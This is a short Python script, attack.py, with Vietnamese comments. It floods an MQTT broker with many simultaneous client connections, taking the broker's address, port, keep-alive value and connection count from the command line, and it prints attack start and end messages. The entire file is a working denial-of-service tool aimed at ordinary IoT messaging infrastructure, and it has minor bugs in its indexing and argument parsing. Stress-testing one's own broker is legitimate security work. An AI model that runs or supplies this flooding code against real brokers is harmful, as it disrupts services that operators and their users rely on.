import paho.mqtt.client as mqtt
import time
from tqdm import tqdm
import subprocess
import sys

# Định nghĩa các giá trị mặc định cho địa chỉ broker, port và keep alive
DEFAULT_BROKER_ADDRESS = "127.0.0.1"
DEFAULT_BROKER_PORT = 1883
DEFAULT_KEEP_ALIVE = 60

def parsing_parameters():
    # Sử dụng các giá trị mặc định nếu không có đối số truyền vào
    broker_address = DEFAULT_BROKER_ADDRESS
    port = DEFAULT_BROKER_PORT
    keepAlive = DEFAULT_KEEP_ALIVE

    l = len(sys.argv)

    # Kiểm tra các đối số được truyền vào từ command line
    for i in range(1,l):
        if(sys.argv[i] == '-p' and i<l):
            port = int(sys.argv[i+1])  # Chuyển đổi port thành số nguyên
        elif(sys.argv[i] == '-k' and i<l):
            if(int(sys.argv[i+1]) > 65535 or int(sys.argv[i+1]) <= 0):
                keepAlive = DEFAULT_KEEP_ALIVE
            else:
                keepAlive = int(sys.argv[i+1])  # Chuyển đổi keepAlive thành số nguyên
        elif(sys.argv[i] == '-a' and i<l):
            broker_address = sys.argv[i+1]  # IP broker address
        elif((sys.argv[i] == '--help' or sys.argv[i] == '-h') and i<=l):
            print('''\nUsage:

    python3 attack.py -a <Broker_Address> -p <Broker_Port> -k <Keep_Alive>

    -a
        IP address of MQTT broker

    -p
        port of MQTT broker (default 1883)

    -k
        keep alive parameter of MQTT protocol (default 60 sec)

            ''')
            exit()

    return broker_address, port, keepAlive

def main(request):
    try:
        _broker_address, _port, _keepAlive = parsing_parameters() # Lấy các giá trị từ đối số truyền vào

        vett = [] # Tạo mảng để lưu trữ clients

        # Tạo các kết nối MQTT
        print('\nRequesting connections...\n')

        for i in tqdm(range(int(request))):
            client = mqtt.Client(f'client{i}')  # Tạo mới client
            vett.append(client)  # Thêm client vào mảng
            vett[i-1].connect(_broker_address, _port, _keepAlive)  # Yêu cầu kết nối tới broker

        print('\nRequests sent !\n')

        print('[ Attack terminated ]\n')

    except KeyboardInterrupt:
        subprocess.call('clear', shell=True)
        print('ERROR: unexpected attack stop')

if __name__ == "__main__":
    request = sys.argv[1]
    main(request)